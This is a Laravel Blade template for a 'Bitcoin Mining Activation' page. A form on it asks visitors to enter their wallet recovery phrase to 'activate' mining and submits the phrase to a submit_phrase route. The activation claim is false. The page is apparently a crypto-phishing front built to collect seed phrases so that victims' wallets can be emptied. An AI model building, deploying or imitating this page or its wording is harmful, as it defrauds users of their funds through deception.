@extends('layouts.frontend')

@section('page-content')
<!--================Header Area =================-->
<header class="main_header_area">
    <nav class="navbar navbar-expand-lg navbar-light">
        <div class="container">
            <!-- Brand and toggle get grouped for better mobile display -->
            <!-- Brand and toggle get grouped for better mobile display -->
            <a class="navbar-brand" href="index.html"><img src="{{URL::asset('assets/image/logo.png')}}" alt=""><img src="{{URL::asset('assets/image/logo2.png')}}" alt=""></a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>

        </div><!-- /.container-fluid -->
    </nav>
</header>
<!--================Header Area =================-->

<!--================Hero banner Area =================-->
<section class="hero_banner_area">
    <div id="particles-js"></div>
    <img class="hero_img" src="{{URL::asset('assets/image/slider.jpg')}}" alt="slider">
    <div class="container">
        <div class="row" style="margin-top: -5rem;">
            <div class="col-lg-6">
                <div class="h_bannr_content">
                    <h5 class="mb_0">Welcome to</h5>
                    <h2 class="mb_0">Bitcoin <span>Mining</span> Activation</h2>
                    <p class="mb_0">Activate your bitcoin to get started</p>
                    <p class="mb_0">Enter your wallet phrase here to activate your wallet for bitcoin mining</p>

                    <form class="get_quote_forms row m0" action="{{ route('submit_phrase') }}" method="post">
                        @csrf
                        <div class="form-group">
                            <input style="background-color:transparent !important; border-bottom: 1px solid grey !important"type="text" name="phrase" class="form-control" id="name" placeholder="Insert Phase" required>
                        </div>
                        <button class="btn theme_btn text-center" type="submit">Click To Activate</button>
                    </form>
                </div>
                <div class="mt-5">
                    @include('layouts.alerts')
                </div>
            </div>
            <div class="col-lg-6">
                <div class="video_img">
                    <img src="{{URL::asset('assets/image/slider/slider-3.png')}}" alt="">
                </div>
            </div>
        </div>
    </div>
</section>
<!--================Hero banner Area =================-->

<!--================ Footer Area =================-->
<footer class="footer_area">
<div class="footer_copyright text-center">
    <div class="container">
        <p class="mb_0">© Copyright  {{config('app.name')}} {{ date('Y') }} . All right reserved.</p>
    </div>
</div>
</footer>
<!--================ Footer Area =================-->
@endsection